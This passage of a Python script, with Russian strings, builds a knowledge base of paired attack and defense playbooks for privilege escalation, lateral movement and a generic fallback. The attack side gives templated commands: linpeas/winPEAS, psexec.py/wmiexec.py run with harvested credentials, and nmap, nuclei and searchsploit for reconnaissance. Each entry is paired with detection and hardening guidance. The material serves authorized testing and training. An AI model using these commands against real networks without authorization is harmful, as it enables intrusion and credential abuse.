                     "Получен доступ/расширение",
                     "Конкретика зависит от сервиса."),
            ]),
        ],
        "tools": [tool("Nuclei", "go install projectdiscovery/nuclei", "Шаблоны мисконфигов"),
                  tool("Nmap (NSE)", "apt install nmap", "Проверки конфигурации")],
        "troubleshooting": ["Конфиг ужесточён -> вектор закрыт."],
        "cleanup": ["Не менять настройки/данные стенда."],
    },
    {
        "summary": "Безопасные дефолты, harden по бенчмаркам (CIS), отключить отладку, регулярный аудит конфигурации.",
        "detection": ["Доступ к админ-интерфейсам/debug-эндпоинтам из неожиданных источников."],
        "hardening": ["Сменить дефолты; отключить debug/лишние модули; harden по CIS; least privilege."],
        "patch": "Конфигурация.",
        "validation": ["Скан мисконфигов чист; дефолтные доступы закрыты."],
    },
)

type_methodic(
    "privilege_escalation",
    "Повышение привилегий (обобщённо) — от пользователя к администратору",
    execution("user", False, True, "tooling",
              "Локальная пост-эксплуатация: из уже имеющегося доступа к более высоким правам."),
    {
        "summary": "Из доступа уровня пользователя — к административным правам через уязвимость ядра/сервиса или мисконфиг.",
        "prerequisites": ["Уже есть доступ уровня пользователя на хосте."],
        "phases": [
            phase("Разведка прав", "Найти путь повышения", [
                step("Автоматический аудит",
                     "Windows: winPEAS ; Linux: linpeas.sh / sudo -l / поиск SUID",
                     "Кандидаты на повышение (мисконфиги, уязвимые сервисы)",
                     "Инструменты подсвечивают слабые места локальной конфигурации."),
            ]),
            phase("Повышение", "Получить админ/root", [
                step("Применить найденный путь",
                     "<эксплойт ядра/сервиса или злоупотребление мисконфигом>",
                     "Права администратора/root",
                     "Конкретика зависит от ОС и найденной слабости."),
            ]),
        ],
        "tools": [tool("winPEAS/linPEAS", "github PEASS-ng", "Аудит локальных слабостей"),
                  tool("GTFOBins/LOLBAS", "веб-справочники", "Злоупотребление штатными бинарями")],
        "troubleshooting": ["Путей повышения не найдено -> хост закалён; искать другой вектор."],
        "cleanup": ["Удалить выгруженные инструменты."],
    },
    {
        "summary": "Своевременные патчи ОС, харднинг, минимизация SUID/прав, EDR, мониторинг повышения прав.",
        "detection": ["Создание процессов с повышением прав; известные приёмы LPE (EDR/Sysmon)."],
        "hardening": ["Патчи ОС; least privilege; убрать лишние SUID/службы; контроль приложений."],
        "patch": "Обновления ОС/сервисов, закрывающие LPE.",
        "validation": ["Известные LPE-проверки не проходят."],
    },
)

type_methodic(
    "lateral_movement",
    "Горизонтальное перемещение (обобщённо) — переход на соседние узлы",
    execution("user", True, False, "tooling",
              "Использование добытых учётных данных/доступа для входа на другие узлы сегмента."),
    {
        "summary": "Используя добытые учётные данные/ключи, получить доступ к другим узлам сети.",
        "prerequisites": ["Есть валидные учётные данные/ключи.", "Сетевой доступ к соседним узлам."],
        "phases": [
            phase("Перемещение", "Войти на соседний узел", [
                step("Удалённый доступ под добытыми данными",
                     "Windows: psexec.py/wmiexec.py <domain>/<user>:<pass>@<host> ; Linux: ssh <user>@<host>",
                     "Сессия на соседнем узле",
                     "Метод зависит от ОС цели и типа учётных данных (пароль/хэш/ключ)."),
            ]),
        ],
        "tools": [tool("Impacket (psexec/wmiexec)", "pip install impacket", "Удалённое выполнение Windows"),
                  tool("NetExec", "pipx install netexec", "Массовый доступ по сегменту"),
                  tool("ssh", "встроен", "Доступ к Linux-узлам")],
        "troubleshooting": ["Учётка не подходит на соседних узлах -> искать другие креды; сегментация мешает -> вектор ограничен."],
        "cleanup": ["Закрыть сессии на промежуточных узлах."],
    },
    {
        "summary": "Уникальные локальные пароли (LAPS), сегментация, MFA для админ-доступа, мониторинг удалённых входов.",
        "detection": ["Удалённое выполнение (psexec/wmiexec/ssh) между рабочими станциями; вход одной учётки на множестве узлов."],
        "hardening": ["LAPS/уникальные пароли; сегментация и фильтрация SMB/WMI/SSH между узлами; MFA."],
        "patch": "Конфигурация.",
        "validation": ["Учётка одного узла не даёт доступа к другим; межузловой SMB/RDP ограничен."],
    },
)

# Типы-синонимы используют ту же обобщённую методичку
TYPE_METHODICS["known_vulnerability"] = dict(TYPE_METHODICS["remote_code_execution"])
TYPE_METHODICS["os_specific"] = dict(TYPE_METHODICS["remote_code_execution"])

# Универсальный запасной вариант, когда тип атаки не распознан вовсе
TYPE_METHODICS["_default"] = {
    "title": "Атака не классифицирована — общий порядок исследования",
    "execution": execution("none", False, False, "tooling",
                          "Тип атаки не распознан: оценка по достижимости и общему профилю; методичка — общий порядок."),
    "attack_methodic": {
        "summary": "Тип атаки во входных данных не указан/не распознан. Общий порядок: определить сервис, "
                   "оценить поверхность, найти известные слабости под конкретный продукт.",
        "prerequisites": ["Сетевой доступ к сервису."],
        "phases": [
            phase("Исследование", "Определить продукт и слабости", [
                step("Идентификация и проверка слабостей",
                     "nmap -sV -sC -p<port> <target> ; nuclei -u <target>:<port> ; searchsploit <продукт>",
                     "Продукт/версия и список потенциальных слабостей",
                     "Дальше выбирается конкретная техника под выявленный продукт."),
            ]),
        ],
        "tools": [tool("Nmap", "apt install nmap", "Идентификация"),
                  tool("Nuclei", "go install projectdiscovery/nuclei", "Проверки уязвимостей/мисконфигов")],
        "troubleshooting": ["Сервис не идентифицируется -> уточнить вручную (баннеры, документация)."],
        "cleanup": ["Сохранить вывод для классификации."],
    },
    "defense_methodic": {
        "summary": "Базовый харднинг: минимизация сервисов, обновления, сегментация, мониторинг.",
        "detection": ["Сканирование/перечисление от неожиданных источников."],
        "hardening": ["Закрыть лишние сервисы; обновления; сегментация; least privilege."],
        "patch": "Обновления производителя.",
        "validation": ["Снаружи виден минимум сервисов; известные проверки чисты."],
    },
    "generic": True,
}


if __name__ == "__main__":
    out_path = os.path.join(os.path.dirname(__file__), "methodics_kb.json")
    payload = {
        "_meta": {
            "description": "Курируемая база методичек атаки и защиты RVC (offline, детерминированная). "
                           "Команды и параметры приведены для учебной лаборатории; запускать только на "
                           "авторизованном стенде.",
            "sources": ["attack.mitre.org", "nvd.nist.gov", "официальные бюллетени MSRC", "документация инструментов"],
            "snapshot": "2026-06-11",
            "disclaimer": "Только для авторизованного тестирования и обучения.",
        },
        # Продукто-специфичные семейства (точная методичка при совпадении по CVE/алиасу)
        "families": FAMILIES,
        # Обобщённые методички по КЛАССУ атаки — корректный fallback для любых
        # данных/сервисов, когда конкретное семейство не найдено (ключ "_default"
        # — когда тип атаки не распознан вовсе).
        "type_methodics": TYPE_METHODICS,
    }
    with open(out_path, "w", encoding="utf-8") as fh:
        json.dump(payload, fh, ensure_ascii=False, indent=2)
    print(f"Семейств: {len(FAMILIES)} | типовых методичек: {len(TYPE_METHODICS)} -> {out_path}")
